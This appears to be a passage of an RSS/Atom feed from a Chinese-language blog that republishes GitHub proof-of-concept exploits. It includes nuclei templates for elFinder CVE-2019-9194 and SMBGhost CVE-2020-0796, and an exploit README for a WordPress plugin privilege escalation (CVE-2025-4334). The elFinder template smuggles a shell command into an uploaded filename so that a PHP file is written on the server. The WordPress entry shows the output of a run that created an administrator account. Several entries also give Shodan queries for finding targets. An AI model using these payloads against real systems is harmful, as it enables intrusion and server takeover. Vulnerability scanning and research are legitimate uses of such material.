class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">9194</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">78</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.92059</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">1.0</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">3</span><br>    <span class="hljs-params">vendor:</span> studio-<span class="hljs-number">42</span><br>    <span class="hljs-params">product:</span> elfinder<br>    <span class="hljs-params">shodan-query:</span> &#x27;http.title:<span class="hljs-string">&quot;elfinder&quot;</span>&#x27;<br>  <span class="hljs-params">tags:</span> cve,cve2019,elfinder,rce,intrusive,file-upload<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">rand_string:</span> &#x27;&#123;&#123;to_lower(rand_text_alpha(<span class="hljs-number">6</span>))&#125;&#125;&#x27;<br>  <span class="hljs-params">file_name:</span> &#x27;&#123;&#123;to_lower(rand_text_alpha(<span class="hljs-number">6</span>))&#125;&#125;&#x27;<br>  <span class="hljs-params">php_cmd:</span> <span class="hljs-string">&quot;&lt;?php echo md5(&#x27;&#123;&#123;file_name&#125;&#125;&#x27;);unlink(__FILE__);?&gt;&quot;</span><br>  <span class="hljs-params">payload:</span> <span class="hljs-string">&quot;&#123;&#123;rand_string&#125;&#125;.jpeg;echo &#123;&#123;base64(php_cmd)&#125;&#125; | base64 -d &gt; &#123;&#123;file_name&#125;&#125;.php;echo &#123;&#123;rand_string&#125;&#125;.jpeg&quot;</span><br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">3</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/php/connector.minimal.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-operator">-</span>---WebKitFormBoundary7MA4YWxkTrZu0gW<br><br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;cmd&quot;</span><br><br>        upload<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target&quot;</span><br><br>        l1_Lw<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;upload[]&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&#123;payload&#125;&#125;&quot;</span><br>        <span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/jpeg</span><br><br>        &#123;&#123;hex_decode(<span class="hljs-string">&quot;ffd8ffe000104a46494600010101006000600000ffed003850686f746f73686f7020332e30003842494d040400000000001c1c027400101c020000020004fffe003b43524541544f523a2067642d6a7065672076312e3020287573696e6720494a47204a50454720763830292c207175616c697479203d2038320affdb0043000604040504040605050506060607090e0909080809120d0d0a0e1512161615121414171a211c17181f1914141d271d1f2223252525161c292c28242b21242524ffdb00430106060609080911090911241814182424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424ffc000110800c0010603012200021101031101ffc4001f&quot;</span>)&#125;&#125;<br>        <span class="hljs-operator">-</span>-----WebKitFormBoundary7MA4YWxkTrZu0gW--<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">name:</span> hash<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> &#x27;.added[<span class="hljs-number">0</span>].hash&#x27;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains_any(body, &#x27;added&#x27;, &#x27;hash&#x27;)&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>php<span class="hljs-operator">/</span>connector.minimal.php<span class="hljs-operator">?</span>target<span class="hljs-operator">=</span>&#123;&#123;hash&#125;&#125;&amp;degree<span class="hljs-operator">=</span><span class="hljs-number">180</span>&amp;mode<span class="hljs-operator">=</span>rotate&amp;cmd<span class="hljs-operator">=</span>resize HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code == 200&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>php<span class="hljs-operator">/</span>&#123;&#123;file_name&#125;&#125;.php HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains(body,<span class="hljs-string">&quot;&#123;&#123;md5(file_name)&#125;&#125;&quot;</span>)&#x27;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; elFinder 命令注入漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/s</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft SMBv3 Remote Code Execution Vulnerability</title>
    <link href="http://example.com/2025/06/26/github_3714233951/"/>
    <id>http://example.com/2025/06/26/github_3714233951/</id>
    <published>2025-06-26T12:15:28.535Z</published>
    <updated>2025-06-26T12:15:28.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Microsoft SMBv3 Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-0796</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Microsoft Server Message Block 3.1.1 (SMBv3)协议处理某些请求时存在远程代码执行漏洞，攻击者可利用此漏洞在目标系统上执行任意代码。</p><p><strong>产品厂商：</strong> microsoft</p><p><strong>产品名称：</strong> windows_10_1903</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:microsoft:windows_10_1903”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/eaab7de730403943f8b44eac9232a1ddf75d9bb2/network%2Fcves%2F2020%2FCVE-2020-0796.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/eaab7de730403943f8b44eac9232a1ddf75d9bb2/network%2Fcves%2F2020%2FCVE-2020-0796.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">0796</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Microsoft SMBv3 <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> Yusuf Amr<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A remote code execution vulnerability exists <span class="hljs-keyword">in</span> the way that the Microsoft Server Message Block <span class="hljs-number">3.1</span>.<span class="hljs-number">1</span> (SMBv3) protocol handles certain requests, aka &#x27;Windows SMBv3 Client<span class="hljs-symbol">/Server</span> Remote Code Execution Vulnerability&#x27;.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cve.mitre.org<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>cvename.cgi<span class="hljs-operator">?</span>name<span class="hljs-operator">=</span>CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">0796</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/tdevworks/CVE-2020-0796-SMBGhost-Exploit-Demo</span><br>    <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//packetstormsecurity.com/files/156731/CoronaBlue-SMBGhost-Microsoft-Windows-10-SMB-3.1.1-Proof-Of-Concept.html</span><br>    <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//packetstormsecurity.com/files/156980/Microsoft-Windows-10-SMB-3.1.1-Local-Privilege-Escalation.html</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">10</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">0796</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">119</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.94419</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99976</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:microsoft:windows_10_1903:-:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:arm64:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> microsoft<br>    <span class="hljs-params">product:</span> windows_10_1903<br>    <span class="hljs-params">shodan-query:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:o:microsoft:windows_10_1903&quot;</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">tags:</span> cve,cve2020,microsoft,smb,kev<br><br><span class="hljs-params">tcp:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">port:</span> <span class="hljs-number">445</span><br><br>    <span class="hljs-params">inputs:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(<span class="hljs-char escape_">\&quot;</span>000000c2fe534d4240000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000024000800000000007f0000000102abcd0102abcd0102abcd0102abcd7800000002000000020210022202240200030203100311030000000001002600000000000100200001000000000000000000000000000000000000000000000000000000000000000000000003000a0000000000010000000100000001000000000000000000<span class="hljs-char escape_">\&quot;</span>)&#125;&#125;&quot;</span><br><br>        <span class="hljs-params">read:</span> <span class="hljs-number">8192</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(<span class="hljs-char escape_">\&quot;</span>000000a0fc534d42ffffffff0100000080000000fe534d424000000000000000010000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000001900000200000000000000005800280000000000000000004e544c4d5353500001000000329088e2000000002800000000000000280000000601b11d0000000f00000000000000000000000000000000<span class="hljs-char escape_">\&quot;</span>)&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> binary<br>        <span class="hljs-params">part:</span> data<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">binary:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;fc534d4248000000&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;0d0000c0&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;1000602d00&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> binary<br>        <span class="hljs-params">part:</span> data<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">binary:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;00000031fc534d424800000001000000000000001eb000fe534d4240000000c00d0000c00100011000602d00100103301e28090442&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Microsoft SMBv3 Remote Code Execution V</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Simple User Registration 权限提升漏洞</title>
    <link href="http://example.com/2025/06/26/github_2825820201/"/>
    <id>http://example.com/2025/06/26/github_2825820201/</id>
    <published>2025-06-26T12:15:15.305Z</published>
    <updated>2025-06-26T12:15:15.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Simple User Registration 权限提升漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-4334</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> WordPress的Simple User Registration插件在6.3及之前的所有版本中存在权限提升漏洞，原因是注册时对用户元值的限制不足。这使得未经认证的攻击者可以注册为管理员。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> Simple User Registration</p><p><strong>影响版本：</strong> version &lt;&#x3D; 6.3</p><p><strong>来源：</strong> <a href="https://github.com/Nxploited/CVE-2025-4334">https://github.com/Nxploited/CVE-2025-4334</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-4334.py</li><li>LICENSE</li><li>README.md</li><li>requirements.txt</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="🔓-Simple-User-Registration"><a href="#🔓-Simple-User-Registration" class="headerlink" title="🔓 Simple User Registration &lt;&#x3D; 6.3 - Unauthenticated Privilege Escalation"></a>🔓 Simple User Registration &lt;&#x3D; 6.3 - Unauthenticated Privilege Escalation</h2><h3 id="📄-Description"><a href="#📄-Description" class="headerlink" title="📄 Description"></a>📄 Description</h3><p>The <strong>Simple User Registration</strong> plugin for WordPress is vulnerable to <strong>Privilege Escalation</strong> in all versions up to, and including, <strong>6.3</strong>.<br>This is due to insufficient restrictions on user meta values that can be supplied during registration.<br>This makes it possible for <strong>unauthenticated attackers</strong> to register as an <strong>administrator</strong>.</p><hr><h3 id="🛡️-Vulnerability-Details"><a href="#🛡️-Vulnerability-Details" class="headerlink" title="🛡️ Vulnerability Details"></a>🛡️ Vulnerability Details</h3><ul><li><strong>Type</strong>: Improper Privilege Management  </li><li><strong>CVE</strong>: CVE-2025-4334  </li><li><strong>CVSS Score</strong>: 9.8 (Critical)  </li><li><strong>CVSS Vector</strong>: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>  </li><li><strong>Publicly Published</strong>: June 25, 2025  </li><li><strong>Last Updated</strong>: June 26, 2025</li></ul><hr><h3 id="🛠️-Exploit-Script"><a href="#🛠️-Exploit-Script" class="headerlink" title="🛠️ Exploit Script"></a>🛠️ Exploit Script</h3><p>The exploit automates privilege escalation via form submission using extracted nonce, form ID, and referer.</p><h4 id="⚙️-Usage"><a href="#⚙️-Usage" class="headerlink" title="⚙️ Usage"></a>⚙️ Usage</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python CVE-2025-4334.py -h<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">usage: CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">4334</span>.py [-h] -u URL --form FORM<br><br>Simple User Registration &lt;= <span class="hljs-number">6.3</span> - Unauthenticated Privilege Escalation - by Khaled Alenazi (Nxploited)<br><br>options:<br>  -h, --help     show this help message and <span class="hljs-keyword">exit</span><br>  -u, --url URL  Base WordPress URL (e.g. http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/wordpress/</span>)<br>  --form FORM    Full URL of the page that contains the registration form<br></code></pre></td></tr></table></figure><hr><h3 id="🌐-URL-Explanation"><a href="#🌐-URL-Explanation" class="headerlink" title="🌐 URL Explanation"></a>🌐 URL Explanation</h3><ul><li><code>-u</code> → Base WordPress installation (e.g. <code>http://localhost/wordpress/</code>)  </li><li><code>--form</code> → Full URL to the vulnerable registration form (e.g. <code>http://localhost/wpr/default-registration/</code>)</li></ul><hr><h3 id="🧪-Example"><a href="#🧪-Example" class="headerlink" title="🧪 Example"></a>🧪 Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python CVE-2025-4334.py -u http://localhost/wordpress/ --form http://localhost/wpr/default-registration/<br></code></pre></td></tr></table></figure><h5 id="✅-Result"><a href="#✅-Result" class="headerlink" title="✅ Result"></a>✅ Result</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">[i] Extracted <span class="hljs-params">Nonce   :</span> ffcf0140a8<br>[i] Extracted Form <span class="hljs-params">ID :</span> <span class="hljs-number">76</span><br>[i] Referer <span class="hljs-params">Path      :</span> <span class="hljs-operator">/</span>wordpress<span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span><span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">06</span><span class="hljs-operator">/</span><span class="hljs-number">25</span><span class="hljs-operator">/</span><span class="hljs-number">33</span><span class="hljs-symbol">/</span><br>[i] HTTP Response <span class="hljs-params">Code :</span> <span class="hljs-number">200</span><br>[i] Server <span class="hljs-params">Response    :</span> &#123;<span class="hljs-string">&quot;user_id&quot;</span>:<span class="hljs-number">13</span>,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-string">&quot;signup&quot;</span>:<span class="hljs-string">&quot;signup&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Registration Done !<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>User Register Email not sent, please contact admin&quot;</span>,<span class="hljs-string">&quot;redirect_url_signup&quot;</span>:<span class="hljs-literal">null</span>&#125;<br><br>[<span class="hljs-operator">+</span>] Exploitation Successful<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Username   :</span> Nxploitedadmin<br>[<span class="hljs-operator">+</span>] First <span class="hljs-params">Name :</span> Nxploitedadmin<br>[<span class="hljs-operator">+</span>] Last <span class="hljs-params">Name  :</span> Nxploitedadmin<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Email      :</span> test@admin.ksa<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Password   :</span> nxp1234<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Role       :</span> administrator<br><br>Exploit <span class="hljs-params">By :</span> Khaled_alenazi (Nxploited)<br></code></pre></td></tr></table></figure><hr><h3 id="⚠️-Disclaimer"><a href="#⚠️-Disclaimer" class="headerlink" title="⚠️ Disclaimer"></a>⚠️ Disclaimer</h3><p>This script is provided for <strong>educational and research purposes only</strong>.<br>The author is <strong>not responsible</strong> for any misuse or damage caused by this tool.</p><hr><p><em>By: Khaled_alenazi (Nxploited)</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Simple User Registration 权限提升漏洞&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
  </entry>
  
  <entry>
    <title>elFinder 命令注入漏洞</title>
    <link href="http://example.com/2025/06/26/github_3029529399/"/>
    <id>http://example.com/2025/06/26/github_3029529399/</id>
    <published>2025-06-26T11:45:26.763Z</published>
    <updated>2025-06-26T11:45:26.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> elFinder 命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-9194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> elFinder 2.1.48之前的版本在PHP连接器中存在命令注入漏洞。该漏洞在执行JPEG文件的图像操作时发生，文件名未经适当清理即传递给<code>exiftran</code>实用程序，允许命令注入。</p><p><strong>产品厂商：</strong> studio-42</p><p><strong>产品名称：</strong> elFinder</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2.1.47</p><p><strong>搜索语法：</strong> http.title:”elfinder”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/a82dd708198aba7cc1638a7c902c787598b79392/http%2Fcves%2F2019%2FCVE-2019-9194.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/a82dd708198aba7cc1638a7c902c787598b79392/http%2Fcves%2F2019%2FCVE-2019-9194.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">9194</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> elFinder <span class="hljs-operator">&lt;=</span> <span class="hljs-number">2.1</span>.<span class="hljs-number">47</span> <span class="hljs-operator">-</span> Command Injection<br>  <span class="hljs-params">author:</span> r00tuser111<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    elFinder before <span 